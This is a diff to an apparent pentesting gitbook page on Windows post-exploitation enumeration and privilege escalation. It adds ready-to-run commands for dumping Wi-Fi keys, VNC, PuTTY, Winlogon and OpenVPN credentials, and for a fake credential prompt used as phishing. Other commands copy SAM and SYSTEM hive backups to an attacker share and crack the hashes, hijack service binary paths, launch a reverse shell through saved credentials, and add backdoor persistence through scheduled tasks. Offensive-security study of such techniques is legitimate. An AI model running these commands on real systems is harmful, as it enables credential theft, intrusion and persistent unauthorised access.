@@ -105,9 +105,19 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 ```
 
+```text
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
+```
+
 {% hint style="info" %}
 for more information on windows registry hive and 'reg' commands refer to[ this section](%20https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/windows/security-component/windows-registry) of the book.
 {% endhint %}
+
+### VNC configurations
+
+```text
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+```
 
 ### check  powershell version
 
@@ -159,7 +169,7 @@ Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, M
 mountvol
 ```
 
-## system logs and audit setting
+## Logs and Audit Setting
 
 ### view system auditing setting
 
@@ -266,7 +276,20 @@ reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
 
-routing info:
+### extract wifi password
+
+```text
+netsh wlan show profile
+netsh wlan show profile <SSID> key=clear
+```
+
+one-liner to extract all APs at once:
+
+```text
+cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
+```
+
+### routing info:
 
 ```text
 route print
@@ -347,7 +370,7 @@ Get-ChildItem C:\Users
 net localgroup Administrators 
 ```
 
-list logon requirements \(useful for bruteforcing\)
+list logon requirements \(useful for brute-forcing\)
 
 ```text
 net accounts
@@ -390,7 +413,7 @@ reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 ```
 
-### list processes
+### list running processes
 
 ```text
 qprocess * 
@@ -425,7 +448,7 @@ tasklist /fi "imagename eq imageName"
 tasklist /fi "imagename eq firefox.exe"
 ```
 
-Find the process running a specific service
+### Find the process running a specific service
 
 ```text
 tasklist /fi "services eq serviceName"
@@ -439,8 +462,6 @@ taskkill -f /pid 1337
 taskkill /IM notepad.exe
 ```
 
-
-
 ### list processes running as "system"
 
 ```text
@@ -451,19 +472,27 @@ tasklist /v /fi "username eq system"
 
 ```text
 wmic product get name, version, vendor
+dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+​
+Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
 ```
 
-show system-wide updates
+### show system-wide updates
 
 ```text
 wmic qfe get Caption, Description, HotFixID, InstalledOn
 ```
 
-uninstall software \(if you have privileges\)
+### uninstall software \(if you have privileges\)
 
 ```text
 wmic product where name="<NAME>" call uninstall /INTERACTIVE:OFF
 ```
+
+## Services
 
 ### view/start/stop a service
 
@@ -483,20 +512,6 @@ get services real name with net start output
 sc getkeyname "service name"
 ```
 
-### list scheduled tasks
-
-```text
-schtasks /query /fo LIST /v
-```
-
-add a startup scheduled task \(useful for persistence\)
-
-```text
-schtasks /create /tn "MyCustomTask" /sc onlogon /tr "C:\users\Administrator\Desktop\backdoor.exe"
-
-schtasks /create /tn "MyCustomTask" /sc onstart /tr "C:\users\Administrator\Desktop\backdoor.exe"
-```
-
 check the required privilege level for each service.
 
 ```text
@@ -506,21 +521,355 @@ accesschk.exe -uwcqv %USERNAME% * /accepteula
 accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
 ```
 
+check if you can modify registry entries of any services
+
+```text
+reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
+​
+#Try to write every service with its current content (to check if you have write permissions)
+for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
+​
+get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
+```
+
+Check if **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have FullControl. In that case you can change the binary that is going to be executed by the service.
+
+To change the Path of the binary executed:
+
+```text
+reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
+```
+
+### find all service executables
+
+```text
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\services.txt
+```
+
+if wmic is not available :
+
+```text
+sc query state= all | findstr "SERVICE_NAME:" >> servicenames.txt
+FOR /F "tokens=2 delims= " %i in (servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+```
+
+### search for unquoted service paths
+
+```text
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+```
+
+### check for weak service permissions
+
+```text
+accesschk.exe -accepteula -wuvc "Everyone" *
+accesschk.exe -accepteula -wuvc "Users" *
+accesschk.exe -accepteula -wuvc "Authenticated Users" *
+```
+
+## Scheduled Tasks
+
+### list scheduled tasks
+
+```text
+schtasks /query /fo LIST /v
+schtasks
+```
+
+### add startup scheduled tasks \(useful for persistence\)
+
+```text
+schtasks /create /tn "MyCustomTask" /sc onlogon /tr "C:\users\Administrator\Desktop\backdoor.exe"
+
+schtasks /create /tn "MyCustomTask" /sc onstart /tr "C:\users\Administrator\Desktop\backdoor.exe"
+```
 
 
 
+## Clear Text Credentials
+
+### search for 'password' keyword in registry hives
+
+```text
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKCU\Software\TightVNC\Server"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query "HKCU\Software\OpenSSH\Agent\Keys"
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+### extract openssh keys from registry
+
+#### [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+
+#### 
+
+### find winlogon stored credentials \(auto login\)
+
+```text
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+```
+
+if you find anything you can connect to the target from kali machine with this command:
+
+```text
+winexe -U 'admin%password123' //192.168.1.22 cmd.exe
+```
+
+### find putty session stored credentials
+
+```text
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+```
+
+### search windows credential manager
+
+```text
+cmdkey /list
+```
+
+to use windows "runas" feature to get a reverse shell:
+
+```text
+runas /savecred /user:admin C:\PrivEsc\reverse.exe 
+```
+
+### kindly asking user for credentials \( phishing \)
+
+```text
+powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
+```
+
+or
+
+```text
+powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
+```
+
+### log files
+
+```text
+# IIS
+C:\inetpub\logs\LogFiles\*
+​
+#Apache
+Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
+```
+
+### OpenVPN credentials
+
+```text
+Add-Type -AssemblyName System.Security
+$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
+$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}
+​
+foreach ($item in $items)
+{
+  $encryptedbytes=$item.'auth-data'
+  $entropy=$item.'entropy'
+  $entropy=$entropy[0..(($entropy.Length)-2)]
+​
+  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+    $encryptedBytes, 
+    $entropy, 
+    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+ 
+  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
+}
+```
+
+### IIS web server configurations
+
+```text
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+C:\inetpub\wwwroot\web.config
+
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+```
+
+### search files for credentials
+
+not as straight forward as linux, we first have to create a listing of all directories in the drive we want \(usually C drive\):
+
+```text
+dir /b /a /s c:\ > cdirs.txt
+
+/b → Uses bare format (no heading information or summary)
+/a → Displays files with specified attributes
+/s → Displays files in specified directory and all subdirectories
+```
+
+then we search this file to find directories and files that might be interesting:
+
+```text
+type cdirs.txt | findstr /i password
+type c:\rto\c-dirs.txt | findstr /i ssh
+type c:\rto\c-dirs.txt | findstr /i kdbx
+type c:\rto\c-dirs.txt | findstr /i vnc
+```
+
+some of the interesting directories/files in windows:
+
+```text
+unattend.xml
+Unattended.xml
+sysprep.inf
+sysprep.xml
+VARIABLES.DAT
+setupinfo
+setupinfo.bak
+web.config
+SiteList.xml
+.aws\credentials
+.azure\accessTokens.json
+.azure\azureProfile.json
+gcloud\credentials.db
+gcloud\legacy_credentials
+gcloud\access_tokens.db
+```
+
+one-liner to check for credentials in all files
+
+```text
+cd C:\
+dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
+```
 
 
 
+### SAM and SYSTEM backups
 
+The SAM and SYSTEM files are located in the C:\Windows\System32\config directory. The files are locked while Windows is running. Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.
 
+if you find any backup files copy them to the attacker machine and use creddump7 to dump the hashes from SAM database:
 
+```text
+copy C:\Windows\Repair\SAM \\192.168.1.11\tools\
+copy C:\Windows\Repair\SYSTEM \\192.168.1.11\tools\
 
+git clone https://github.com/Neohapsis/creddump7.git
 
+python2 creddump7/pwdump.py SYSTEM SAM
+```
 
+you can try to crack the admin hash with hashcat:
 
+```text
+hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+```
 
+### Cloud Credentials <a id="cloud-credentials"></a>
 
+```text
+##From user home.aws\credentialsAppData\Roaming\gcloud\credentials.dbAppData\Roaming\gcloud\legacy_credentialsAppData\Roaming\gcloud\access_tokens.db.azure\accessTokens.json.azure\azureProfile.json
+```
+
+### Tools that search for passwords <a id="tools-that-search-for-passwords"></a>
+
+​[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim. [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatically search for all the files containing passwords mentioned in this page. [**Lazagne**](https://github.com/AlessandroZ/LaZagne) is another great tool to extract password from a system.
+
+The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) search for **sessions**, **usernames** and **passwords** of several tools that save this data in clear text \(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\)
+
+```text
+Import-Module path\to\SessionGopher.ps1;Invoke-SessionGopher -ThoroughInvoke-SessionGopher -AllDomain -oInvoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p [email protected]
+```
+
+## Files and Shares
+
+### find files by name
+
+```text
+gdr -PSProvider 'FileSystem' | %{ls -r $_.root} 2>$null | where { $_.name -eq "flag.txt"} -verbose
+```
+
+find all DOC files in C drive
+
+```text
+Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\temp}
+```
+
+### search for a string/regex in a file
+
+```text
+type [file] | find /i "[string]"
+type [file] | findstr [regex]
+```
+
+search for a file in a directory
+
+```text
+dir /b /s [directory]\[file]
+dir /b /s c:\wmic.exe
+```
+
+### find all files with a particular name:
+
+```text
+Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt
+```
+
+### show drives and disk info
+
+```text
+fsutil fsinfo
+```
+
+tree map of a drive
+
+```text
+tree C:\ /f /a > C:\output_of_tree.txt
+```
+
+### find writable files
+
+```text
+accesschk.exe -uws "Everyone" "C:\Program Files"
+
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone"}
+```
+
+### check for weak file permissions
+
+```text
+accesschk.exe -uws "Everyone" "C:\Program Files" 
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+
+some important files to look for
+
+```text
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+```
+
+### connect to a network share
+
+```text
+net use K: \\<IP address\share IE C or Admin>  
+net use K: \\192.168.31.53\C  <--this will connect to the K drive
+net use K: \\192.168.31.53\C$ /user:george P@$$Word34 
+```
 
 
 
